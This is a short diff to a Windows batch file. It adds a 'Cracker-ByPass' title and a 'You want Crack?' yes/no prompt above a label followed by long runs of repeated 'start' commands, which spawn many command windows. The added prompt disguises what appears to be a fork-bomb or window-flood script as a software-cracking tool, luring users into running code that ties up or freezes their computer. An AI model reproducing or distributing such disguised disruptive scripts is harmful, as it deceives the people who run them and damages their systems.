@@ -1,3 +1,12 @@
+@echo OFF
+TITLE Cracker-ByPass
+
+@echo OFF
+ECHO You want Crack?
+ECHO Enter Y for yes
+ECHO Enter N for no
+CHOICE /c YN /m "Yes or No"
+
 a:
 start start start start start start start start start start start start start start start start start start start start start start start start start start start start
 start start start start start start start start start start start start start start start start start start start start start start start start start start start start
